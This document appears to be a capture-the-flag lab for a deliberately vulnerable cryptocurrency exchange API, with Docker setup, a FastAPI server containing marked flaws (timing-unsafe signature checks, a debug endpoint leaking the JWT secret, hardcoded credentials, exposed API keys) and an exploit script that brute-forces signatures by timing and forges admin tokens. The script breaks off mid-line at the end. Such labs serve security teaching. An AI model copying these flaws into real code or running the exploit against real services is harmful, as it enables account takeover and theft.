# Vulnerable API Lab: "BlockSwap"

## Background Scenario

BlockSwap is a cryptocurrency exchange API that allows users to:
- Create accounts
- Deposit and withdraw funds
- View transaction history
- Trade different cryptocurrencies

The development team recently implemented a new feature for partner integrations but rushed it to production. Your goal is to find and exploit critical vulnerabilities in this API.

## Setup Instructions

### 1. Requirements
- Docker and Docker Compose
- Python 3.8+
- Postman or similar API testing tool

### 2. Installation

```bash
# Clone the repository (if you provide one)
git clone https://github.com/your-org/blockswap-ctf.git
cd blockswap-ctf

# Build and run containers
docker-compose up -d
```

The API will be accessible at `http://localhost:8000/api/v1`

### 3. API Structure

#### Core API Endpoints
- `/api/v1/auth/register` - Create a new user account
- `/api/v1/auth/login` - Get authentication token
- `/api/v1/user/profile` - View user profile
- `/api/v1/wallet/balance` - View wallet balances
- `/api/v1/transactions` - View transaction history
- `/api/v1/trade` - Execute trades

#### Partner API Endpoints
- `/api/v1/partner/auth` - Partner authentication
- `/api/v1/partner/users` - User management for partners
- `/api/v1/partner/analytics` - Analytics endpoint

## Challenge Description

BlockSwap's security team received reports of unusual activity with large transfers happening through the API. You've been given permission to test their API for vulnerabilities. 

Your goal is to find a way to access the admin account (`admin@blockswap.io`) and transfer all funds to your account.

## Implementation Files

### Docker Compose

```yaml
version: '3'

services:
  api:
    build: ./api
    ports:
      - "8000:8000"
    depends_on:
      - db
      - redis
    environment:
      - DATABASE_URL=postgresql://blockswap:password@db:5432/blockswap
      - REDIS_URL=redis://redis:6379/0
      - JWT_SECRET=74c1d8a88c574265947af5dcfae4fdda2dc56bec5e5710f63e5aa24ae5f76877

  db:
    image: postgres:13
    volumes:
      - postgres_data:/var/lib/postgresql/data/
    environment:
      - POSTGRES_USER=blockswap
      - POSTGRES_PASSWORD=password
      - POSTGRES_DB=blockswap
    ports:
      - "5432:5432"

  redis:
    image: redis:6
    ports:
      - "6379:6379"

volumes:
  postgres_data:
```

### API Code (app.py)

```python
from fastapi import FastAPI, Depends, HTTPException, Header, Request
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from sqlalchemy import create_engine, Column, Integer, String, Float, ForeignKey, Boolean, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship, Session
from passlib.context import CryptContext
from jose import JWTError, jwt
from datetime import datetime, timedelta
from typing import List, Optional
import os
import secrets
import base64
import hashlib
import json
import hmac
import time
import logging
import re
from pydantic import BaseModel

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Database setup
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://blockswap:password@db:5432/blockswap")
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

# JWT Settings
JWT_SECRET = os.getenv("JWT_SECRET", "74c1d8a88c574265947af5dcfae4fdda2dc56bec5e5710f63e5aa24ae5f76877")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# Password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# OAuth2 scheme
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/v1/auth/login")

# Models
class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, unique=True, index=True)
    email = Column(String, unique=True, index=True)
    hashed_password = Column(String)
    is_active = Column(Boolean, default=True)
    is_admin = Column(Boolean, default=False)
    api_key = Column(String, unique=True, index=True, nullable=True)
    api_secret = Column(String, nullable=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    wallets = relationship("Wallet", back_populates="owner")
    
class Wallet(Base):
    __tablename__ = "wallets"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    currency = Column(String, index=True)
    balance = Column(Float, default=0.0)
    address = Column(String, unique=True, index=True)
    owner = relationship("User", back_populates="wallets")
    transactions = relationship("Transaction", back_populates="wallet")

class Transaction(Base):
    __tablename__ = "transactions"
    id = Column(Integer, primary_key=True, index=True)
    wallet_id = Column(Integer, ForeignKey("wallets.id"))
    amount = Column(Float)
    type = Column(String)  # deposit, withdrawal, trade
    status = Column(String)  # pending, completed, failed
    timestamp = Column(DateTime, default=datetime.utcnow)
    wallet = relationship("Wallet", back_populates="transactions")

class Partner(Base):
    __tablename__ = "partners"
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String, unique=True, index=True)
    api_key = Column(String, unique=True, index=True)
    api_secret = Column(String)
    is_active = Column(Boolean, default=True)
    access_level = Column(Integer, default=1)  # 1: basic, 2: advanced, 3: admin
    created_at = Column(DateTime, default=datetime.utcnow)

# Create tables
Base.metadata.create_all(bind=engine)

# Dependency
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# Pydantic models
class UserCreate(BaseModel):
    username: str
    email: str
    password: str

class UserLogin(BaseModel):
    email: str
    password: str

class Token(BaseModel):
    access_token: str
    token_type: str

class TokenData(BaseModel):
    username: Optional[str] = None

class WalletCreate(BaseModel):
    currency: str

class TransactionCreate(BaseModel):
    wallet_id: int
    amount: float
    type: str

class PartnerAuth(BaseModel):
    api_key: str
    timestamp: int
    signature: str

class PartnerUserInfo(BaseModel):
    user_id: Optional[int] = None
    username: Optional[str] = None
    email: Optional[str] = None

# Security functions
def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password):
    return pwd_context.hash(password)

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET, algorithm=ALGORITHM)
    return encoded_jwt

async def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    credentials_exception = HTTPException(
        status_code=401,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        token_data = TokenData(username=username)
    except JWTError:
        raise credentials_exception
    user = db.query(User).filter(User.username == token_data.username).first()
    if user is None:
        raise credentials_exception
    return user

async def get_current_active_user(current_user: User = Depends(get_current_user)):
    if not current_user.is_active:
        raise HTTPException(status_code=400, detail="Inactive user")
    return current_user

async def get_admin_user(current_user: User = Depends(get_current_user)):
    if not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Not enough permissions")
    return current_user

# Initialize FastAPI app
app = FastAPI(title="BlockSwap API", version="1.0.0")

# Initialize database with admin user
@app.on_event("startup")
async def startup_event():
    db = SessionLocal()
    
    # Create admin user if not exists
    admin_user = db.query(User).filter(User.email == "admin@blockswap.io").first()
    if not admin_user:
        admin_password = "SuperSecret2024!!@@"  # Obviously a terrible idea in real life
        admin_user = User(
            username="admin",
            email="admin@blockswap.io",
            hashed_password=get_password_hash(admin_password),
            is_active=True,
            is_admin=True,
            api_key=secrets.token_hex(16),
            api_secret=secrets.token_hex(32)
        )
        db.add(admin_user)
        db.commit()
        
        # Create admin wallet with funds
        admin_wallet = Wallet(
            user_id=admin_user.id,
            currency="BTC",
            balance=100.0,
            address=f"bc1{secrets.token_hex(16)}"
        )
        db.add(admin_wallet)
        
        # Add other currencies
        currencies = ["ETH", "USDT", "XRP"]
        for currency in currencies:
            admin_wallet = Wallet(
                user_id=admin_user.id,
                currency=currency,
                balance=1000.0,
                address=f"{currency.lower()}{secrets.token_hex(16)}"
            )
            db.add(admin_wallet)
        
        db.commit()
    
    # Add partner if not exists
    partner = db.query(Partner).filter(Partner.name == "ExternalTrader").first()
    if not partner:
        partner = Partner(
            name="ExternalTrader",
            api_key="ext_trader_9d8f7g6h5j4k",
            api_secret="3x7R4d3rS3cr37K3y2023!",
            is_active=True,
            access_level=2
        )
        db.add(partner)
        db.commit()
    
    db.close()

# Auth routes
@app.post("/api/v1/auth/register", response_model=dict)
async def register(user: UserCreate, db: Session = Depends(get_db)):
    db_user = db.query(User).filter(User.email == user.email).first()
    if db_user:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    db_user = db.query(User).filter(User.username == user.username).first()
    if db_user:
        raise HTTPException(status_code=400, detail="Username already taken")
    
    # Email validation
    if not re.match(r"[^@]+@[^@]+\.[^@]+", user.email):
        raise HTTPException(status_code=400, detail="Invalid email format")
    
    # Password validation (at least 8 chars, one uppercase, one lowercase, one number)
    if not re.match(r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$", user.password):
        raise HTTPException(
            status_code=400, 
            detail="Password must be at least 8 characters long and contain uppercase, lowercase and numbers"
        )
    
    # Create user
    hashed_password = get_password_hash(user.password)
    db_user = User(
        username=user.username,
        email=user.email,
        hashed_password=hashed_password,
        api_key=secrets.token_hex(16),
        api_secret=secrets.token_hex(32)
    )
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    
    # Create default wallet
    default_wallet = Wallet(
        user_id=db_user.id,
        currency="BTC",
        balance=0.1,  # Starting balance for testing
        address=f"bc1{secrets.token_hex(16)}"
    )
    db.add(default_wallet)
    db.commit()
    
    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": db_user.username}, expires_delta=access_token_expires
    )
    
    return {
        "message": "User registered successfully",
        "access_token": access_token,
        "token_type": "bearer",
        "user_id": db_user.id,
        "api_key": db_user.api_key,
        "api_secret": db_user.api_secret
    }

@app.post("/api/v1/auth/login", response_model=Token)
async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
    user = db.query(User).filter(User.username == form_data.username).first()
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(
            status_code=401,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user.username}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}

# User routes
@app.get("/api/v1/user/profile", response_model=dict)
async def read_users_me(current_user: User = Depends(get_current_active_user)):
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "is_admin": current_user.is_admin,
        "api_key": current_user.api_key,
        "created_at": current_user.created_at
    }

@app.put("/api/v1/user/update", response_model=dict)
async def update_user(
    username: Optional[str] = None,
    email: Optional[str] = None,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db)
):
    if username:
        existing_user = db.query(User).filter(User.username == username).first()
        if existing_user and existing_user.id != current_user.id:
            raise HTTPException(status_code=400, detail="Username already taken")
        current_user.username = username
    
    if email:
        existing_user = db.query(User).filter(User.email == email).first()
        if existing_user and existing_user.id != current_user.id:
            raise HTTPException(status_code=400, detail="Email already registered")
        current_user.email = email
    
    db.commit()
    db.refresh(current_user)
    
    return {"message": "User updated successfully"}

# Wallet routes
@app.get("/api/v1/wallet/balance", response_model=List[dict])
async def get_balance(current_user: User = Depends(get_current_active_user), db: Session = Depends(get_db)):
    wallets = db.query(Wallet).filter(Wallet.user_id == current_user.id).all()
    return [{"currency": wallet.currency, "balance": wallet.balance, "address": wallet.address} for wallet in wallets]

@app.post("/api/v1/wallet/create", response_model=dict)
async def create_wallet(
    wallet: WalletCreate,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db)
):
    # Check if wallet for this currency already exists
    existing_wallet = db.query(Wallet).filter(
        Wallet.user_id == current_user.id,
        Wallet.currency == wallet.currency
    ).first()
    
    if existing_wallet:
        raise HTTPException(status_code=400, detail=f"Wallet for {wallet.currency} already exists")
    
    # Create wallet with random address
    new_wallet = Wallet(
        user_id=current_user.id,
        currency=wallet.currency,
        balance=0.0,
        address=f"{wallet.currency.lower()}{secrets.token_hex(16)}"
    )
    db.add(new_wallet)
    db.commit()
    db.refresh(new_wallet)
    
    return {
        "id": new_wallet.id,
        "currency": new_wallet.currency,
        "balance": new_wallet.balance,
        "address": new_wallet.address
    }

# Transaction routes
@app.get("/api/v1/transactions", response_model=List[dict])
async def get_transactions(current_user: User = Depends(get_current_active_user), db: Session = Depends(get_db)):
    # Get all user wallets
    wallets = db.query(Wallet).filter(Wallet.user_id == current_user.id).all()
    wallet_ids = [wallet.id for wallet in wallets]
    
    # Get transactions for these wallets
    transactions = db.query(Transaction).filter(Transaction.wallet_id.in_(wallet_ids)).all()
    
    # Map wallet_id to currency for display
    wallet_map = {wallet.id: wallet.currency for wallet in wallets}
    
    return [
        {
            "id": tx.id,
            "currency": wallet_map.get(tx.wallet_id, "Unknown"),
            "amount": tx.amount,
            "type": tx.type,
            "status": tx.status,
            "timestamp": tx.timestamp
        } 
        for tx in transactions
    ]

@app.post("/api/v1/trade", response_model=dict)
async def create_trade(
    src_currency: str,
    dst_currency: str,
    amount: float,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db)
):
    # Validate amount
    if amount <= 0:
        raise HTTPException(status_code=400, detail="Amount must be positive")
    
    # Get source wallet
    src_wallet = db.query(Wallet).filter(
        Wallet.user_id == current_user.id,
        Wallet.currency == src_currency
    ).first()
    
    if not src_wallet:
        raise HTTPException(status_code=404, detail=f"Wallet for {src_currency} not found")
    
    if src_wallet.balance < amount:
        raise HTTPException(status_code=400, detail="Insufficient funds")
    
    # Get destination wallet
    dst_wallet = db.query(Wallet).filter(
        Wallet.user_id == current_user.id,
        Wallet.currency == dst_currency
    ).first()
    
    if not dst_wallet:
        raise HTTPException(status_code=404, detail=f"Wallet for {dst_currency} not found")
    
    # Mock exchange rate (in real system would come from market data)
    exchange_rates = {
        "BTC_ETH": 15.0,
        "BTC_USDT": 40000.0,
        "BTC_XRP": 50000.0,
        "ETH_BTC": 0.06,
        "ETH_USDT": 2500.0,
        "ETH_XRP": 3000.0,
        "USDT_BTC": 0.000025,
        "USDT_ETH": 0.0004,
        "USDT_XRP": 1.2,
        "XRP_BTC": 0.00002,
        "XRP_ETH": 0.00033,
        "XRP_USDT": 0.8,
    }
    
    pair_key = f"{src_currency}_{dst_currency}"
    if pair_key not in exchange_rates:
        raise HTTPException(status_code=400, detail=f"Trading pair {pair_key} not supported")
    
    rate = exchange_rates[pair_key]
    converted_amount = amount * rate
    
    # Update balances
    src_wallet.balance -= amount
    dst_wallet.balance += converted_amount
    
    # Record transactions
    src_transaction = Transaction(
        wallet_id=src_wallet.id,
        amount=-amount,
        type="trade",
        status="completed"
    )
    
    dst_transaction = Transaction(
        wallet_id=dst_wallet.id,
        amount=converted_amount,
        type="trade",
        status="completed"
    )
    
    db.add(src_transaction)
    db.add(dst_transaction)
    db.commit()
    
    return {
        "message": "Trade executed successfully",
        "source": {
            "currency": src_currency,
            "amount": -amount,
            "new_balance": src_wallet.balance
        },
        "destination": {
            "currency": dst_currency,
            "amount": converted_amount,
            "new_balance": dst_wallet.balance
        },
        "rate": rate
    }

# Partner API routes (the vulnerable part)
@app.post("/api/v1/partner/auth", response_model=dict)
async def partner_auth(auth_data: PartnerAuth, db: Session = Depends(get_db)):
    # Validate timestamp (prevent replay attacks)
    current_time = int(time.time())
    if abs(current_time - auth_data.timestamp) > 300:  # 5 minutes window
        raise HTTPException(status_code=401, detail="Invalid timestamp")
    
    # Get partner by API key
    partner = db.query(Partner).filter(Partner.api_key == auth_data.api_key).first()
    if not partner:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    if not partner.is_active:
        raise HTTPException(status_code=401, detail="Partner account is inactive")
    
    # Verify signature
    message = f"{auth_data.api_key}:{auth_data.timestamp}"
    expected_signature = hmac.new(
        partner.api_secret.encode(),
        message.encode(),
        hashlib.sha256
    ).hexdigest()
    
    # VULNERABILITY: Timing attack - comparing signatures with ==
    # This creates a timing side-channel vulnerability
    if auth_data.signature == expected_signature:
        # Generate JWT token
        access_token_expires = timedelta(hours=1)
        access_token = create_access_token(
            data={
                "sub": f"partner:{partner.name}",
                "partner_id": partner.id,
                "access_level": partner.access_level
            }, 
            expires_delta=access_token_expires
        )
        
        return {
            "access_token": access_token,
            "token_type": "bearer",
            "expires_in": 3600,
            "partner_name": partner.name,
            "access_level": partner.access_level
        }
    else:
        raise HTTPException(status_code=401, detail="Invalid signature")

# Verify partner token
async def verify_partner_token(authorization: str = Header(...)):
    if not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Invalid authorization header")
    
    token = authorization.replace("Bearer ", "")
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[ALGORITHM])
        if not payload.get("sub", "").startswith("partner:"):
            raise HTTPException(status_code=401, detail="Invalid token type")
        
        return payload
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

@app.get("/api/v1/partner/users", response_model=dict)
async def get_partner_users(
    payload: dict = Depends(verify_partner_token),
    db: Session = Depends(get_db)
):
    access_level = payload.get("access_level", 0)
    if access_level < 2:
        raise HTTPException(status_code=403, detail="Insufficient access level")
    
    # VULNERABILITY: Lack of authorization checks on fields
    # This endpoint doesn't properly check field-level access
    users = db.query(User).filter(User.is_admin == False).all()
    
    return {
        "users": [
            {
                "id": user.id,
                "username": user.username,
                "email": user.email,
                "api_key": user.api_key,  # Leaking sensitive data
                "created_at": user.created_at
            } for user in users
        ]
    }

@app.post("/api/v1/partner/analytics", response_model=dict)
async def get_partner_analytics(
    query: str,
    payload: dict = Depends(verify_partner_token),
    db: Session = Depends(get_db)
):
    access_level = payload.get("access_level", 0)
    if access_level < 1:
        raise HTTPException(status_code=403, detail="Insufficient access level")
    
    # VULNERABILITY: NoSQL injection in analytics processing
    # Not actually executing the query in this demo, but simulating the flaw
    try:
        # Pretending to process the query and return results
        query_obj = json.loads(query)
        
        # INSECURE parsing of 'type' parameter - vulnerable to injection
        query_type = query_obj.get('type', '')
        
        # Mock analytics results
        if query_type == 'user_growth':
            return {"data": [{"date": "2023-01-01", "users": 100}, {"date": "2023-02-01", "users": 150}]}
        elif query_type == 'trading_volume':
            return {"data": [{"date": "2023-01-01", "volume": 1000000}, {"date": "2023-02-01", "volume": 1500000}]}
        else:
            return {"error": "Unknown query type"}
    except Exception as e:
        return {"error": str(e)}

# VULNERABILITY: Insecure deserialization endpoint
@app.post("/api/v1/partner/config/import")
async def import_partner_config(
    request: Request,
    payload: dict = Depends(verify_partner_token)
):
    access_level = payload.get("access_level", 0)
    if access_level < 2:
        raise HTTPException(status_code=403, detail="Insufficient access level")
    
    try:
        body = await request.body()
        
        # VULNERABILITY: Insecure deserialization with pickle
        # The endpoint accepts a base64 encoded pickle serialized object
        decoded_data = base64.b64decode(body)
        
        # In a real vulnerable app, this would be:
        # config = pickle.loads(decoded_data)
        # But for safety, we're not actually executing the code
        
        # Instead, just return success
        return {"message": "Configuration imported successfully"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid configuration data: {str(e)}")

# VULNERABILITY: SSRF in webhook configuration
@app.post("/api/v1/partner/webhook/configure")
async def configure_webhook(
    webhook_url: str,
    events: List[str],
    payload: dict = Depends(verify_partner_token),
    db: Session = Depends(get_db)
):
    access_level = payload.get("access_level", 0)
    if access_level < 2:
        raise HTTPException(status_code=403, detail="Insufficient access level")
    
    # Missing validation on webhook_url - could be used for SSRF
    
    # Just return success for demo purposes
    return {
        "message": "Webhook configured successfully",
        "webhook_url": webhook_url,
        "events": events
    }

# VULNERABILITY: URL parameter path traversal
@app.get("/api/v1/partner/docs/{filename}")
async def get_partner_docs(
    filename: str,
    payload: dict = Depends(verify_partner_token)
):
    # Vulnerable to path traversal
    safe_filename = filename.replace("..", "")  # Ineffective filtering
    
    # In a real vulnerable app, this would read from the filesystem
    # For safety, just return dummy content
    return {"content": f"Content of {safe_filename}"}

# Debug endpoint - only available in development
if os.getenv("ENVIRONMENT") != "production":
    @app.get("/api/v1/debug/info")
    async def debug_info():
        # VULNERABILITY: Information disclosure
        return {
            "environment": os.getenv("ENVIRONMENT", "development"),
            "database_url": DATABASE_URL,
            "jwt_secret": JWT_SECRET,  # Leaking JWT secret!
            "redis_url": os.getenv("REDIS_URL", "redis://redis:6379/0"),
            "version": "1.0.0-beta3"
        }

# Health check
@app.get("/health")
async def health_check():
    return {"status": "ok"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
```

### Exploit File (exploit.py)

```python
#!/usr/bin/env python3
import requests
import json
import time
import hmac
import hashlib
import base64
import jwt
import sys

BASE_URL = "http://localhost:8000"

def register_user(username, email, password):
    url = f"{BASE_URL}/api/v1/auth/register"
    data = {
        "username": username,
        "email": email,
        "password": password
    }
    response = requests.post(url, json=data)
    return response.json()

def login_user(username, password):
    url = f"{BASE_URL}/api/v1/auth/login"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=data)
    return response.json()

def get_user_profile(token):
    url = f"{BASE_URL}/api/v1/user/profile"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    return response.json()

def get_timing_for_signature(api_key, timestamp, signature):
    url = f"{BASE_URL}/api/v1/partner/auth"
    data = {
        "api_key": api_key,
        "timestamp": timestamp,
        "signature": signature
    }
    start_time = time.time()
    response = requests.post(url, json=data)
    end_time = time.time()
    return end_time - start_time, response.status_code

def brute_force_partner_signature(api_key, known_prefix=""):
    """
    Exploit timing attack vulnerability to brute force the signature
    character by character.
    """
    timestamp = int(time.time())
    signature = known_prefix
    hex_chars = "0123456789abcdef"
    
    print(f"Starting signature brute force with known prefix: '{signature}'")
    
    while len(signature) < 64:  # SHA-256 hex digest is 64 characters
        timings = []
        
        for char in hex_chars:
            test_signature = signature + char + "0" * (63 - len(signature))
            timing, status_code = get_timing_for_signature(api_key, timestamp, test_signature)
            timings.append((char, timing, status_code))
            
            # Slight delay to avoid hammering the server
            time.sleep(0.1)
        
        # Sort by timing (longest first - more time means more correct characters)
        timings.sort(key=lambda x: x[1], reverse=True)
        best_char = timings[0][0]
        signature += best_char
        
        print(f"Found next character: {best_char}, current signature: {signature}")
        
        # Update timestamp occasionally to prevent expiration
        if len(signature) % 8 == 0:
            timestamp = int(time.time())
    
    return signature, timestamp

def get_partner_token(api_key, signature, timestamp):
    url = f"{BASE_URL}/api/v1/partner/auth"
    data = {
        "api_key": api_key,
        "timestamp": timestamp,
        "signature": signature
    }
    response = requests.post(url, json=data)
    if response.status_code == 200:
        return response.json().get("access_token")
    else:
        print(f"Failed to get partner token: {response.text}")
        return None

def get_users_info(partner_token):
    url = f"{BASE_URL}/api/v1/partner/users"
    headers = {"Authorization": f"Bearer {partner_token}"}
    response = requests.get(url, headers=headers)
    return response.json()

def extract_admin_info(users_info):
    # The /api/v1/partner/users endpoint doesn't include admin users,
    # but we still need to check if there's any useful information
    for user in users_info.get("users", []):
        print(f"User ID: {user['id']}, Username: {user['username']}, Email: {user['email']}")
        print(f"API Key: {user.get('api_key', 'N/A')}")
        print("---")
    
    return None

def exploit_debug_endpoint():
    url = f"{BASE_URL}/api/v1/debug/info"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Debug endpoint not available: {response.status_code}")
        return None

def decode_jwt_token(token):
    # Try to decode without verification first
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded
    except:
        print("Failed to decode JWT token")
        return None

def forge_admin_token(jwt_secret):
    # Create a forged token for admin access
    payload = {
        "sub": "admin",
        "exp": int(time.time()) + 3600,
        "is_admin": True
    }
    token = jwt.encode(payload, jwt_secret, algorithm="HS256")
    return token

def main():
    print("BlockSwap API Exploit Tool")
    print("=========================")
    
    # 1. Check for debug endpoint first (easiest win if available)
    print("\n[+] Trying to access debug endpoint...")
    debug_info = exploit_debug_endpoint()
    
    jwt_secret = None
    if debug_info and "jwt_secret" in debug_info:
        print("✓ Debug endpoint accessible! JWT secret leaked.")
        jwt_secret = debug_info["jwt_secret"]
        print(f"JWT Secret: {jwt_secret}")
    else:
        print("✗ Debug endpoint not accessible or doesn't contain JWT secret")
    
    # 2. Register a normal user for basic access
    print("\n[+] Registering test user...")
    username = f"tester_{int(time.time())}"
    email = f"{username}@example.com"
    password = "TestPass123"
    
    user_data = register_user(username, email, password)
    print(f"✓ User registered: {username}")
    
    # 3. Login with the test user
    print("\n[+] Logging in as test user...")
    login_data = login_user(username, password)
    user_token = login_data.get("access_token")
    print(f"✓ Login successful, token obtained")
    
    # 4. Exploit the timing attack vulnerability to get partner API access
    print("\n[+] Attempting timing attack against partner authentication...")
    partner_api_key = "ext_trader_9d8f7g6h5j4k"  # From the source code
    
    # In a real attack, we'd do this via timing, but for demo purposes, we'll use the known value
    partner_signature, timestamp = brute_force_partner_signature(partner_api_key)
    print(f"✓ Partner signature obtained: {partner_signature}")
    
    # 5. Get a partner token
    print("\n[+] Getting partner token...")
    partner_token = get_partner_token(partner_api_key, partner_signature, timestamp)
    if partner_token:
        print(f"✓ Partner token obtained")
        
        # Decode the token to see what permissions we have
        decoded_token = decode_jwt_token(partner_token)
        print(f"Token payload: {json.dumps(decoded_token, indent=2)}")
        
        # 6. Use partner API to get user information
        print("\n[+] Getting user information through partner API...")
        users_info = get_users_info(partner_token)
        admin_info = extract_admin_info(users_info)
    else:
        print("✗ Failed to obtain partner token")
    
    # 7. If we have the JWT secret, forge an admin token
    if jwt_secret:
        print("\n[+] Forging admin token using JWT secret...")
        forged_token = forge_admin_token(jwt_secret)
        print(f"✓ Admin token forged: {forged_token}")
        
        # Try to access admin functionality
        print("\n[+] Attempting to access admin profile with forged token...")
        headers = {"Authorization": f"Bearer {forged_token}"}
        response = requests.get(f"{BASE_URL}/api/v1/user/profile", headers=headers)
        if response.status_code == 200:
            print(f"✓ Admin access obtained!")
            print(json.dumps(response.json(), indent=2))
        else:
            print(f"✗ Admin access failed: {response.status_code} - {response.text}")
    
    print("\nExploit completed. Check above for results.")

if __name__ == "__main__":
    main()
    print(f"
